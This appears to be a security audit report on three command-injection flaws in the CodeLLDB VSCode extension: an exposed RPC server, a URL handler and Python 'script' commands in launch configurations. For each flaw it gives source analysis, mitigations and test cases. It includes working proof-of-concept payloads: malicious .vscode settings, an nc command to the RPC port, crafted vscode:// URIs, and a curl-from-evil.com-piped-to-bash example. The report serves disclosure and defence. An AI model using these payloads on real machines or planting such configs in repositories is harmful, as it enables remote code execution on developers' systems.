# Critical Security Vulnerabilities in CodeLLDB

## Vulnerability 1: Command Injection via RPC Server

### Description
The CodeLLDB extension offers an RPC server feature that listens for debug configurations on a Unix or TCP socket. The implementation has insufficient validation of the commands that can be included in these debug configurations. When a victim opens a malicious repository in VSCode with a workspace configuration that enables the RPC server, an attacker can send carefully crafted JSON payloads to the RPC server to execute arbitrary commands on the victim's machine.

Step by step exploit:
1. Create a malicious repository with a `.vscode/settings.json` file that contains:
   ```json
   {
     "lldb.rpcServer": { 
       "host": "0.0.0.0", 
       "port": 12345
     }
   }
   ```
2. When the victim opens this repository in VSCode, the extension will start an RPC server listening on all interfaces
3. Send a payload to the RPC server containing malicious commands in the `processCreateCommands` or `preRunCommands` fields:
   ```json
   {
     "processCreateCommands": ["platform shell command_to_execute"]
   }
   ```
4. These commands will be executed on the victim's machine with the same privileges as VSCode

### Impact
This vulnerability allows remote code execution on the victim's machine. An attacker can execute arbitrary commands with the permissions of the VSCode process, potentially leading to complete system compromise.

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
The only security measure is an optional token attribute that can be added to the server configuration, but this is:
1. Not mandatory
2. Not enabled by default
3. Easily omitted in a malicious configuration

### Missing Mitigations
- The RPC server should not bind to external interfaces by default
- Strict validation of commands sent through this interface
- Mandatory authentication
- Protection against CSRF attacks when connecting to local sockets
- Warning to the user when an RPC server is started

### Preconditions
1. Victim must open a malicious repository in VSCode
2. The CodeLLDB extension must be installed
3. The victim's firewall must allow connections to the configured port (if attacked remotely)

### Source Code Analysis
In the `externalLaunch.ts` file, the `RpcLaunchServer` class processes incoming requests by parsing them using YAML.parse and then passes them directly to VSCode's debug.startDebugging API:

```typescript
async processRequest(request: string) {
    let debugConfig: DebugConfiguration = {
        type: 'lldb',
        request: 'launch',
        name: '',
    };
    Object.assign(debugConfig, YAML.parse(request));
    debugConfig.name = debugConfig.name || debugConfig.program;
    if (this.token) {
        if (debugConfig.token != this.token)
            return '';
        delete debugConfig.token;
    }
    try {
        let success = await debug.startDebugging(undefined, debugConfig);
        return JSON.stringify({ success: success });
    } catch (err) {
        return JSON.stringify({ success: false, message: err.toString() });
    }
}
```

In `main.ts`, the RPC server is configured based on user settings:

```typescript
updateRpcServer() {
    if (this.rpcServer) {
        output.appendLine('Stopping RPC server');
        this.rpcServer.close();
        this.rpcServer = null;
    }
    let config = getExtensionConfig();
    let options = config.get('rpcServer') as any;
    if (options) {
        output.appendLine(`Starting RPC server with: ${inspect(options)}`);
        this.rpcServer = new RpcLaunchServer({ token: options.token });
        this.rpcServer.listen(options)
    }
}
```

This allows a malicious repository to configure the RPC server to listen on all interfaces (0.0.0.0) without requiring authentication.

### Security Test Case
1. Set up a victim machine with VSCode and CodeLLDB extension
2. Create a malicious repository with this `.vscode/settings.json`:
   ```json
   {
     "lldb.rpcServer": {
       "host": "0.0.0.0",
       "port": 12345
     }
   }
   ```
3. Have the victim open this repository in VSCode
4. From an attacker machine, run:
   ```bash
   echo '{"targetCreateCommands":["target create /bin/ls"], "processCreateCommands":["platform shell touch /tmp/pwned"]}' | nc victim-ip 12345
   ```
5. Verify that the file `/tmp/pwned` has been created on the victim's machine, confirming successful command execution

## Vulnerability 2: Command Injection via URL Handlers

### Description
CodeLLDB implements URL handlers that allow launching debug sessions from outside VSCode. One of these handlers accepts a command line to execute without proper validation, which can be exploited to execute arbitrary commands. An attacker can craft a malicious URI that, when clicked by a victim, will execute arbitrary commands through the debugging infrastructure.

Step by step exploit:
1. Create a malicious URI like: `vscode://vadimcn.vscode-lldb/launch/command?/bin/sh -c 'malicious command'`
2. Distribute this URI to a victim (e.g., in a markdown file, email, or webpage)
3. When the victim clicks the URI, VSCode will open and CodeLLDB will execute the specified command

### Impact
This vulnerability allows command execution on the victim's machine. An attacker can execute arbitrary commands with the permissions of the VSCode process when a victim clicks a malicious URI.

### Vulnerability Rank
High

### Currently Implemented Mitigations
None identified. The URL handler appears to directly process the command line specified in the URI without proper validation.

### Missing Mitigations
- Validation of commands passed via URI
- Confirmation dialog before launching debug sessions from external URIs
- Restricting what commands can be executed via the URL handler

### Preconditions
1. Victim must have VSCode with CodeLLDB extension installed
2. Victim must click the malicious URI

### Source Code Analysis
In `externalLaunch.ts`, the `UriLaunchServer` class handles URIs:

```typescript
async handleUri(uri: Uri) {
    try {
        output.appendLine(`Handling uri: ${uri}`);
        let query = decodeURIComponent(uri.query);
        output.appendLine(`Decoded query:\n${query}`);

        if (uri.path == '/launch/command') {
            let frags = query.split('&');
            let cmdLine = frags.pop();

            let env: Dict<string> = {}
            for (let frag of frags) {
                let pos = frag.indexOf('=');
                if (pos > 0)
                    env[frag.substr(0, pos)] = frag.substr(pos + 1);
            }

            let args = stringArgv(cmdLine);
            let program = args.shift();
            let debugConfig: DebugConfiguration = {
                type: 'lldb',
                request: 'launch',
                name: '',
                program: program,
                args: args,
                env: env,
            };
            debugConfig.name = debugConfig.name || debugConfig.program;
            await debug.startDebugging(undefined, debugConfig);
        }
        // [other handlers omitted for brevity]
    } catch (err) {
        await window.showErrorMessage(err.message);
    }
}
```

The cmdLine from the URI is split using stringArgv and used to create a debug configuration without any validation. If a malicious command like `/bin/sh -c 'curl http://evil.com/script | bash'` is passed, it will be executed through the debugging infrastructure.

### Security Test Case
1. Set up a victim machine with VSCode and CodeLLDB extension
2. Create a URI: `vscode://vadimcn.vscode-lldb/launch/command?/bin/sh -c 'touch /tmp/url_handler_pwned'`
3. Have the victim click this URI (e.g., by embedding it in a markdown document)
4. Verify that the file `/tmp/url_handler_pwned` has been created on the victim's machine, confirming successful command execution

## Vulnerability 3: Code Execution via Python Expression Evaluation

### Description
CodeLLDB allows Python expressions to be evaluated within the debugging context. These expressions have full access to Python's functionality including the ability to import modules and execute arbitrary code. A malicious repository can include launch configurations with crafted Python expressions that execute arbitrary code when a victim starts debugging.

Step by step exploit:
1. Create a malicious repository with a `.vscode/launch.json` file containing:
   ```json
   {
     "configurations": [{
       "type": "lldb",
       "request": "launch",
       "name": "Debug",
       "program": "${workspaceFolder}/some_program",
       "preRunCommands": [
         "script import os; os.system('malicious command')"
       ]
     }]
   }
   ```
2. When the victim opens this repository and starts debugging, the Python code in `preRunCommands` will be executed

### Impact
This vulnerability allows execution of arbitrary code when a victim starts debugging a malicious repository. The code will run with the same privileges as the VSCode process.

### Vulnerability Rank
High

### Currently Implemented Mitigations
None identified. The Python expression evaluator appears to run with full privileges and access to all Python modules.

### Missing Mitigations
- Sandboxing Python evaluation
- Restricting module imports in evaluated expressions
- Warning the user before executing Python code from untrusted sources
- Disabling dangerous functions in the Python environment

### Preconditions
1. Victim must open a malicious repository in VSCode
2. The CodeLLDB extension must be installed
3. Victim must start debugging the project

### Source Code Analysis
Python expressions can be included in debug configurations as seen in `main.ts` where debug configurations are processed:

```typescript
async resolveDebugConfiguration(
    folder: WorkspaceFolder | undefined,
    launchConfig: DebugConfiguration,
    cancellation?: CancellationToken
): Promise<DebugConfiguration> {
    // [...]
    let launchDefaults = getExtensionConfig(folder, 'launch');
    this.mergeWorkspaceSettings(launchConfig, launchDefaults);
    // [...]
    return launchConfig;
}

mergeWorkspaceSettings(debugConfig: DebugConfiguration, launchConfig: WorkspaceConfiguration) {
    // [...]
    mergeConfig('initCommands');
    mergeConfig('preRunCommands');
    mergeConfig('postRunCommands');
    // [...]
}
```

These commands are passed to the debug adapter which evaluates them within the LLDB interpreter, which can run arbitrary Python code through the `script` command. The extension doesn't perform any validation on these commands, allowing execution of arbitrary Python code.

### Security Test Case
1. Set up a victim machine with VSCode and CodeLLDB extension
2. Create a malicious repository with this `.vscode/launch.json`:
   ```json
   {
     "configurations": [{
       "type": "lldb",
       "request": "launch",
       "name": "Debug",
       "program": "${workspaceFolder}/some_program",
       "preRunCommands": [
         "script import os; os.system('touch /tmp/python_eval_pwned')"
       ]
     }]
   }
   ```
3. Have the victim open this repository in VSCode and start debugging
4. Verify that the file `/tmp/python_eval_pwned` has been created on the victim's machine, confirming successful code execution